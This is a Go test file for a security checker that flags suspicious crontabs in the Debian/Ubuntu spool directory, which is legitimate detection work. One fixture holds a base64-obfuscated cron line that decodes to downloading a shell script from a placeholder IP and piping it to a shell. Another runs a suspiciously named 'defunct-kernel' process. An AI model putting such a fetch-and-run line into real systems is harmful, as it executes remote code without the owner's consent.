package checks

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"
)

func withCronSpoolDir(t *testing.T, dir string) {
	t.Helper()
	old := cronSpoolDir
	cronSpoolDir = func() string { return dir }
	t.Cleanup(func() { cronSpoolDir = old })
}

// On Debian/Ubuntu user crontabs live in /var/spool/cron/crontabs. A check
// that globs /var/spool/cron/* sees only the crontabs directory itself and
// never a single user crontab.
func TestCheckCrontabsReadsDebianSpool(t *testing.T) {
	store := newCrontabTestStore(t)
	withCronSpoolDir(t, "/var/spool/cron/crontabs")
	const evil = "/var/spool/cron/crontabs/alice"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/crontabs/*" {
				return []string{evil}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{evil: time.Now()}),
		readFile: func(name string) ([]byte, error) {
			if name == evil {
				return []byte("* * * * * echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjkveC5zaCB8IHNo | base64 -d|bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckCrontabs(context.Background(), nil, store)
	var seen bool
	for _, f := range findings {
		if f.Check == "suspicious_crontab" && f.FilePath == evil {
			seen = true
		}
	}
	if !seen {
		t.Fatalf("suspicious Debian user crontab not reported: %+v", findings)
	}
}

func TestAccountCrontabCheckReadsDebianSpool(t *testing.T) {
	withCronSpoolDir(t, "/var/spool/cron/crontabs")
	const target = "/var/spool/cron/crontabs/bob"
	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
		if name == target {
			return []byte("* * * * * defunct-kernel\n"), nil
		}
		return nil, os.ErrNotExist
	}})
	findings := makeAccountCrontabCheck("bob")(context.Background(), nil, nil)
	if len(findings) == 0 {
		t.Fatal("suspicious Debian account crontab was not reported")
	}
	if findings[0].FilePath != target || !strings.Contains(findings[0].Details, "File: "+target+"\n") {
		t.Fatalf("finding did not carry the Debian crontab path: %+v", findings[0])
	}
}

func TestCronSpoolOwnerAcceptsDebianUserCrontab(t *testing.T) {
	withCronSpoolDir(t, "/var/spool/cron/crontabs")
	owner, ok := cronSpoolOwner("/var/spool/cron/crontabs/alice")
	if !ok || owner != "alice" {
		t.Fatalf("cronSpoolOwner = (%q, %v), want (alice, true)", owner, ok)
	}
}

func TestCrontabFixRootContainsDebianSpool(t *testing.T) {
	const path = "/var/spool/cron/crontabs/alice"
	got, err := sanitizeFixPath(path, fixCrontabAllowedRoots)
	if err != nil || got != path {
		t.Fatalf("sanitizeFixPath(%q) = (%q, %v), want accepted", path, got, err)
	}
}
